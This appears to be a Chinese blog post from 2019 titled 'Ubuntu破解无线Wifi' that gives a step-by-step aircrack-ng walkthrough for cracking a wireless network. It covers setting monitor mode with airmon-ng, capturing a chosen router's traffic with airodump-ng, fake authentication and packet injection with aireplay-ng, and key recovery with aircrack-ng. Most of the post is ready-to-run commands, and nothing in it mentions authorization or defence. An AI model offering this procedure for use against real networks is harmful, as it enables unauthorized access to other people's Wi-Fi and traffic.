---
title: Ubuntu破解无线Wifi
date: 2019-09-15 21:00:31
tags: aircrack-ng 
---
# 1.查看网络接口
Ubuntu 中，通常有线网卡端口为enp2s0(eth0)，无线网卡端口则为wlp1s0(wlan0)，使用wlp3s0这种复杂的名字主要是为了减少网卡的枚举。
```bash
ifconfig
```
查看无线网卡的端口。wlp1s0
查看MAC地址,在ether后面。a0:c5:89:77:47:78

# 2.工具
aircrack-ng:
Aircrack-ng是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上（设备列表请参阅其官方网站）并嗅探802.11a，802.11b，802.11g的数据。该程序可运行在Linux和Windows上。Linux版本已经被移植到了Zaurus和Maemo系统平台, 并概念验证可移植到iPhone。

# 3.启动无线网卡监听模式
```bash
sudo airmon-ng start +无线网卡的端口
```

# 4.监听周围所有无线网络
```bash
sudo airodump-ng +无线网卡的端口 （注意在将无线网卡变为监听模式后，端口名会改变）wlp1s0mon
```

# 5.监听指定的无线网络（注意要在新的窗口哦）
```bash
sudo airodump-ng --bssid +路由器MAC -c +信道 -w +文件名 +无线网卡的端口  64:58:AD:44:AF:16
```

# 6.与AP建立虚拟连接（注意在新的窗口哦）
```bash
sudo aireplay-ng -1 0 -a +路由器MAC -h +本机无线网卡MAC +无线网卡端口
```

# 7.进行注入
```bash
sudo aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b +路由器MAC -h +本机无线网卡MAC +无线网卡端口
```

# 8.解密
```bash
sudo aircrack-ng +文件名*.cap
```

# 9.结束
```bash
sudo airmon-ng stop +无线网卡端口
```
